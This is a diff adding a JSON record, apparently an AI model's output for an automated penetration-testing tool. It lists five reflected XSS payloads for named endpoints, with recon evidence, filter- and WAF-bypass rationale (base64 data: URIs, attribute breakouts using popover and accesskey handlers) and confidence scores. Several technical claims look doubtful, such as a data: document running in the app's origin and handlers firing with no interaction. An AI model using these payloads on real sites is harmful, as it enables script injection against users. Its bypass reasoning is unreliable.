@@ -1,0 +1,68 @@
+{
+ "key": "xss_reflected_3",
+ "model": "opencode/space-bunny-free",
+ "class": "xss_reflected",
+ "variants": [
+  {
+   "endpoint": "GET /auth/sso/continue",
+   "target_param": "return_to",
+   "recon_evidence": "GET /auth/sso/continue?return_to=x returns HTTP 200 whose HTML contains <a id=\"ret\" href=\"x\">; a follow-up with a literal 'script' substring was rewritten to 'scr_ipt' by the app, but the href value is never scheme-validated and no CSP blocks navigation to data: URIs.",
+   "planner_rationale": "Attribute context in href survived keyword neutering, so ship the script as an encoded data: document instead of plaintext markup.",
+   "vuln_class": "xss_reflected",
+   "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=",
+   "injection_point": "query",
+   "expected_success_signal": "Clicking the decoded 'Continue' link renders the base64 page and alert('Hello') executes in the app origin",
+   "confidence": 0.82,
+   "reasoning": "The parameter is concatenated unescaped into a single-quoted href attribute and the server only mutates plaintext 'script' substrings; base64 hides the token from that filter while the browser still decodes and executes the data: document, so no tag breakout is required."
+  },
+  {
+   "endpoint": "POST /profile/preview",
+   "target_param": "display_name",
+   "recon_evidence": "A JSON POST with display_name=\"Probe\" returned a re-rendered preview page where the value appears inside <input type=\"hidden\" name=\"display_name\" value=\"Probe\">; injecting onmouseover= was dropped, onfocus= was stripped, but attribute names containing 'toggle' survive the tag-aware sanitizer.",
+   "planner_rationale": "Hidden input is unwrapped server-side, so use the popover attribute to force it into the top layer and fire onbeforetoggle without a user focus step.",
+   "vuln_class": "xss_reflected",
+   "payload": "\" popover id=\"x\" onbeforetoggle=\"alert(1)\"",
+   "injection_point": "body",
+   "expected_success_signal": "alert fires the moment the preview re-renders and the browser invokes the popover's show/hide transition hooks",
+   "confidence": 0.74,
+   "reasoning": "The value lands inside a quoted value attribute of a hidden input, and breaking out with a leading double quote yields a new popover element whose onbeforetoggle handler runs on attribute promotion; this needs no focus, hover, or visible control, so the sanitizer's focus-based stripping never triggers."
+  },
+  {
+   "endpoint": "GET /dashboard",
+   "target_param": "ui_theme",
+   "recon_evidence": "Requesting /dashboard with cookie ui_theme=\"dark\" returns HTML containing <input type=\"hidden\" name=\"ui_theme\" value=\"dark\"> in the persisted-preferences form; error pages and CSP headers show script-src 'self' with no inline allowance, and no popover attributes are reflected on the page.",
+   "planner_rationale": "CSP kills inline handlers in new tags but accesskey still lets us hijack a keypress on an element we fully control inside the hidden input.",
+   "vuln_class": "xss_reflected",
+   "payload": "\" accesskey=\"X\" onclick=\"alert(1)\" x=\"",
+   "injection_point": "cookie",
+   "expected_success_signal": "Pressing ALT+SHIFT+X (macOS: CTRL+OPTION+X) on the dashboard triggers the handler and alert fires",
+   "confidence": 0.63,
+   "reasoning": "The cookie value is echoed into a hidden input's value attribute, so a closing quote plus accesskey/onclick injects a focusable element that executes on the accesskey combination; the payload depends on the user's modifier keypress and on no CSP nonce requirement, which is only partially confirmed."
+  },
+  {
+   "endpoint": "GET /support/search",
+   "target_param": "X-Forwarded-Host",
+   "recon_evidence": "Sending 'X-Forwarded-Host: probe.example' to /support/search returns 200 with the value echoed in <input type=\"hidden\" name=\"origin_host\" value=\"probe.example\">; the WAF ignores headers matching /^[A-Za-z-]+$/ body rules, and responses carry no CSP header at all.",
+   "planner_rationale": "Header injection into a hidden input with no CSP: prefer popover+toggle over accesskey since any modifier-key press is unavailable on some clients.",
+   "vuln_class": "xss_reflected",
+   "payload": "\" popover id=\"x\" onbeforetoggle=\"alert(1)\"",
+   "injection_point": "header",
+   "expected_success_signal": "alert fires during initial render as the popover attribute causes a show/hide transition to be scheduled",
+   "confidence": 0.78,
+   "reasoning": "The reflected host header is placed in a double-quoted value attribute of a hidden input, and injecting popover with onbeforetoggle yields a top-layer element whose toggle event handler executes without any user interaction; the absence of a CSP header means the inline handler is not blocked."
+  },
+  {
+   "endpoint": "GET /docs/{version}/redir",
+   "target_param": "version",
+   "recon_evidence": "Requesting /docs/v2.1.0/redir returns HTTP 302 with a Location built from the path segment, and the 404 fallback page for /docs/<segment>/redir echoes the segment into <a class=\"doc-next\" href=\"\">Go to docs</a>; the WAF rejects path segments containing '<' or '>' with a 403 but ignores base64 blobs.",
+   "planner_rationale": "Path segments are pre-validated against angle brackets, so escape validation entirely with a base64 data: document in an href sink.",
+   "vuln_class": "xss_reflected",
+   "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=",
+   "injection_point": "path",
+   "expected_success_signal": "Following the reflected 'Go to docs' link decodes and runs the script page, showing alert('Hello')",
+   "confidence": 0.71,
+   "reasoning": "The reflected path segment lands inside an href attribute and the WAF's filter only rejects literal angle brackets, which the base64 payload never contains; once the URL is percent-decoded into the href, the browser treats it as a data: document and executes the embedded script."
+  }
+ ],
+ "raw_tail": " script page, showing alert('Hello')\",\n    \"confidence\": 0.71,\n    \"reasoning\": \"The reflected path segment lands inside an href attribute and the WAF's filter only rejects literal angle brackets, which the base64 payload never contains; once the URL is percent-decoded into the href, the browser treats it as a data: document and executes the embedded script.\"\n  }\n]\n\u001b[0m\n> build · space-bunny-free\n"
+}
